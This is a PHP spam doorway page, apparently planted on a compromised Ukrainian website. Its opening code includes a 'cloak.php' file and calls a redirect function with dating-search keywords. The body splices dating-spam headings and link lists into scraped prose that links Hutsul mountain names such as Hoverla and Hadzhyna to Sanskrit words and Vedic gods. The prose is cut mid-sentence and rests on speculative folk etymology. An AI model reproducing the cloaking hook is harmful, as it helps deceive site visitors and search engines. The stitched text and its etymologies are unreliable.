<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%b7+%d0%b6%d1%96%d0%bd%d0%ba%d0%b0%d0%bc%d0%b8+%d0%bf%d0%be%d0%b1%d0%bb%d0%b8%d0%b7%d1%83+%d0%a0%d0%b0%d1%85%d1%96%d0%b2+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Топоніми Гуцульщини та індоарійські міфи</title>
	<meta name="description" content="Николай Павлович, 32 роки, познайомлюсь з жінкою - мета знайомства: шлюб, створення сім'ї, народження, виховання дитини. 0" />
	<link rel="canonical" href="https://masage.od.ua/img/184/qyqe-znayomstva-z-zhnkami.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/196/qe-naykrash-znayomstva-poblizu.php">найкращі знайомства поблизу Соледар Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/418/bewy-dvchina-znayomstva-poblizu.php">дівчина знайомства поблизу Виноградів Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/361/xinok-naykrash-sayti-znayomstv.php">найкращі сайти знайомств в Інтернеті Скадовськ Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Знайомства з жінками поблизу Рахів Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>І це, очевидно, давніше святилище ніж на Попівані — Чорнобогу Крішні, бо, як говорять легенди, Крішна заперечив Інду. Коли літописець Гуцулів — Михайло Ломацький перераховує полонини, першою називає Гаджину, а богів громовержців — Іллю тобто Індру , Михайла і Юрія. Гуцульське — гадє, означає зміїв, що співзвучне з Гаджиною і стосується змієборця Індри.</p><a id='v1'></a><h3>Тур-знайомство “ЗаКарпатська романтика”</h3><p>Можливо в пантеон Індри вплітаються і Шпиці зі скелями, на яких колись гніздились орли орел Гаруда їздова тварина Індри , і полонина Марішевска теж сюди підходить, бо Марути — божества вітру й буревіїв у ведійській міфології, а сама назва, марути, тлумачиться — «які віють з моря», вони складають військо бога-воївника Індри — володаря сварги—неба й ватажка небесного воїнства, хоч батьком їх вважається Рудра-Род Стрибог, Влес-Велес. От вам і часточка моря — озеро Бребенескул за хребтом, на заході, звідки в основному і дмуть чорногірські вітри.</p>
		
	<p>Неподалік, ще одне високогірне озеро — Несамовите, яке в гуцульських легендах теж повязують з зародженням вітрів, буревіїв. Полонина Псарівка на протилежному боці долини Бистреця, теж сюди, бо ж була у Індри сука Сарама, що шукала священних корів ведійські легенди. Індра відповідає за схід, куди й розвернута полонина.</p>
<p>Ще багато незрозумілого, чим старіша назва тим більша імовірність перекручень, спотворень, бракує автентичної інформації, легенд і Гуцульських і Індійських. Так легенда, про штурм Індрою асурської Трипури, дуже б підійшла до цього ландшафту, і в. Ребра може була — Рудра інша назва бога Шіви, одного з трьох основних ведійських богів , який приймав участь у штурмі, і синами якого є Марути. Та однозначно Гаджина — полонина Індри, верховного божества оспівуваного в індоарійських гімнамнах «Рігведи» десь приблизно з середини 2 тисячоліття до нашої ери.</p>
		
			
				<div>Рахів - Rahó - Rahău - Rauhau - Рахов</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/fmPR6O0qe6w' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Ми ще до неї повернемось, як до одного з ключових місць Чорногори. Найкращим, найправильнішим, найохайнішим відрогом всіх цих велетнів є г. Гомул м. І перекладається він як го — «корови, худоба», мула — «корінь, основа» 4. Це було не тільки найкрасивішим місцем випасу племінної худоби, бо ж стоїть він трохи осторонь хребта, з чудовими краєвидами найкращих чорногірських полонин, але й місцем прощі, пожертви за худобу є й інші припущення, але про них трохи далі.</p><strong><a id='v2'></a><h2>Ясіня | Знайомства 💗 | Рахівський район, Закарпатська область — mistaUA</h2></strong><p>Отак, ми майже під Говерлою. Тут витоки Прута. Починаючи з відрога Шпиць — Гомул м. аж під саму Говерлу великі кітли—кари, збирають для нього воду. Далі під в. Туркул на рівненькому місці під хребтом озеро Несамовите м.</p>
		
			<br><ol>
			
				<li>Рахів | Знайомства 💗 | Закарпатська область — mistaUA.</li>
			
				<li>міські швидкісні знайомства Ватутіне Україна.</li>
			
				<li>підключення зараз у Соснівка Україна.</li>
			
			</ol>
		
	<p>Туркулом, що в чистому виді «Тур» у родинному хребті — «кул», в. Данциж м. Пожежевска м. Брецкул м. і вже Говерла. Слід зауважити, що і в. Гутин Томнатик, і в. Туркул з пд. є неприступними, обривистими і їх «бичі» назви можуть свідчити про роль оборонних бастіонів на хребті, бо з пд. Вершина Данциж від Дан, Дану, Дана — матріархальна богиня давньоукраїнської міфології, уособлення жіночого начала й первозданних, так званих «жіночих», тобто земних вод — з них, за давніми уявленнями, творився упорядкований, налагоджений, праведний світ.</p>
<p>Споріднене з ведійською Дану, матірю первісних богів «асурів» 6 ст. Кінцеве — ж, у назві Данциж, як у назві Житомир, чи гуцульській древній коляді приспів «гей дай бо — же», це древня форма — «життя, світ» 3 ст.</p><strong><a id='v3'></a><h2>Знайомства Ясіня</h2></strong><p>Схожі назви в найбільших річок — Дон, Дністер, Дніпро, Дунай, та інші. На різних картах Чорногори назви, які хочете — Данціж, Данцір, Данцер, Данцеж, що є доказом найдревнішої форми цього слова. Підтвердженням назви вершини-життєдайниці є і озеро внизу, під вершиною з пн. Гомула і Шпиць з карлінгами-Кізлами та озером Несамовитим, аж під схили в. Туркул, дренує потік -Данцежик. По той бік хребта, з пд. сх, полонина Озірна з великою кількістю гарних маленьких озер. Так що, води там багато, як ніде на Чорногорі. До того ж зауважу, що це єдине жіноче, матріархальне святилище на Чорногорі.</p>
<p>Наступна вершина в хребті Пожижевська ,2 м. Далі два «ж» в теперішньому звучанні, а точніше — «джі», санскр. Отже, по-джі-джів можна розтлумачити як Охоронниця життя душі. Схожі назви вже зустрічались на підходах до святилищ, такі як Степанець, Берестечко, описані вище. Вони приурочені до шляхів, які пролягали більш пологими хребтами, яким в даному випадку пн. відріг Пожижевської і являється. Схожу назву має вершина перед святилищем на Лисині Космацькій — Пожеретул, і, можливо, теж був охоронним бастіоном, а заодно і дороговказом.</p>
<p>Святилища ж давали не тільки духовний і енергетичний заряд людині, але й були обсерваторіями часу і простору, та давали реальні знання, необхідні для ведення господарства, а це і було основою життя. Вершину Брецкула м. Він «кул» тобто в хребті.</p>
		
	<p>Ніякого іншого значення чи функції у системі святилищ він не несе. Говерла м. Ведійські легенди оспівують подвиг Крішни, що захистив людей і худобу від розлюченого Індри, коли той наслав на них зливи за непокору. Крішна тримав над їхніми головами гору Говардгану, як парасольку, демонструючи свою силу, як нового бога.</p>
<p>Тож і Говерла безперечно вплітається у величне піднебесне святилище — Чорногора, і виправдовує її загальну назву. Так, найпологішою дорогою на вершину цього, безперечно, величного святилища була дорога по хребтах як колись і ходили люди з пн. Тож Кукуль від санскр. Кукіла — «Гора, Цар, Стовп-Опора землі» 3 ст. З горою Кознєска Козмєска , важче, «Куджа» — землею народжена, по нашому — коза, а точніше — козеня, бо маленька, хоч і як Говерла народжена Землею. Та доброго пояснення немає.</p>
<p>По той бік схил Говерли на польській карті зветься Дріжіполе мале і велике з санскриту «дрідга» — сильне, могутнє, можливо не в значенні поля , а «поле — поліс» в значенні міста, тобто «могутнє місто, поселення» де проживали брахмани мудрі , знаючі люди , що вели спостереження з вершини. Долиною збігає потік з одноіменною назвою — Говерла.</p><a id='v4'></a><h3>Главное меню</h3><p>Слід сказати і про р. Прут, стара назва — Пората, «по» — «па» — «охоронець, захисник», «раштра» означає «країна, держава». Та цій назві він має завдячувати і Говерлі і Данціжу. Вищеописану теорію про Говерлу як святилище-обсерваторію можна перевірити проклавши уявну лінію з вершини у одному з важливих річних напрямків, у бік зимового сонцестояння.</p><img src="https://img01.obyava.ua/classified/0/1435/7173/200-z6hphaaorj9y17mo.jpg" alt="Навігаційне меню" style="max-width: 480px; max-height: 480px;"/><p>Ця лінія з вершини Говерли пройде біля вершини Гомул над полониною Гаджіна. до нашої ери переміщувалось сонце по небу в період весняного рівнодення.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/398/cuqu-naykrashiy-trener.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/406/kuc-plosha-znayomstv-poblizu.php">площа знайомств поблизу Сарни Україна</a></li><li><a href="https://masage.od.ua/img/313/hebo-dvchata-znayomstva-v.php">дівчата знайомства в Камінь-Каширський Україна</a></li><li><a href="https://masage.od.ua/img/471/lajir-msto-onlayn.php">місто онлайн знайомства поблизу Миколаїв Україна</a></li><li><a href="https://masage.od.ua/img/211/hyw-znayomstva-tsvtnnya-slavuta.php">знайомства цвітіння Славута Україна</a></li><li><a href="https://masage.od.ua/img/137/za-privatn-sluzhbi-znayomstv.php">приватні служби знайомств в Путивль Україна</a></li><li><a href="https://masage.od.ua/img/133/nozep-sayti-znayomstv-z.php">сайти знайомств з людьми в Миколаїв Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#v1'>Тур-знайомство “ЗаКарпатська романтика”</a></li>
<li><a href='#v2'>Ясіня | Знайомства 💗 | Рахівський район, Закарпатська область — mistaUA</a></li>
<li><a href='#v3'>Знайомства Ясіня</a></li>
<li><a href='#v4'>Главное меню</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/184/net-znayomstva-dlya-odinokih.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>